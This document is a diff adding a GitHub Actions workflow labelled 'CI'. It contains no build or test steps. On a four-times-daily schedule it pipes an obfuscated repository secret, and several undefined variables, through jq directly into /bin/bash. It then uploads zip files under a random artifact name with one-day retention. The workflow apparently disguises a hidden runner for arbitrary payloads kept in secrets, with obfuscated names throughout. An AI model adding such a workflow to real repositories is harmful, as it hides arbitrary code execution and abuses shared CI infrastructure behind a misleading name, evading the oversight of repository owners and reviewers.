@@ -1,0 +1,31 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          be74: ${{ secrets.be74 }}
+        run: |
+          printf '%s' "$be74" | jq -r .qrz6549 | /bin/bash
+          echo $gh9008 | jq -r .wptuu914 | /bin/bash
+          echo $bu641 | jq -r .ja9 | /bin/bash
+          echo $tyvl9 | jq -r .jetak49905 | /bin/bash
+          printf '%s' "$p7976" | jq -r .pmbuy25 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8KqakXQq
+          path: "*.zip"
+          retention-days: 1
